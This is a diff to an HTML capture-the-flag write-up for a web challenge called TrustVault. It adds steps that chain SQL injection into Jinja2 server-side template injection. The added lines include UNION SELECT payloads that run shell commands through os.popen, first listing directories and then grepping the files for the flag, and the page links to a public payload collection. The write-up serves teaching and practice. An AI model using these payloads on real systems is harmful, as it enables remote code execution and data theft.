@@ -184,16 +184,23 @@
 
     <p>Visit <code>/search</code> → renders all bookmarks as Jinja2 templates!<br>
     Test <code>"{{7*7}}'</code> → <strong>49</strong> → Jinja confirmed.</p>
+    <img src="Pic/TrustVault/3.png" alt="Jinja">
 
     <h2>2. SSTI Embedded inside of SQLi</h2>
     <p>Bookmarks are stored via raw SQL → inject SSTI payload directly into the database.</p>
 
     <p>Final payload in the bookmark field:</p>
+    <p>First, Lets try to list directories</p>
+    <pre><code>' UNION SELECT "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}" --</code></pre>
+    <p>And we successfully get the directories back</p>
+    <img src="Pic/trustVault/4.png" alt="ls">
+    <p>Iam kind of lazy, So what if i just string everything and grep the flag alongside it lol</p>
+    <p>Final payload.</p>
     <pre><code>' UNION SELECT "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('strings * | grep -i pctf{').read() }}" --</code></pre>
 
     <p>Payload reference:<br>
-    <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md" target="_blank">
-      https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md
+    <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#jinja2" target="_blank">
+      Payload Here!
     </a></p>
 
     <p>Visit <code>/search</code> → flag printed instantly.</p>
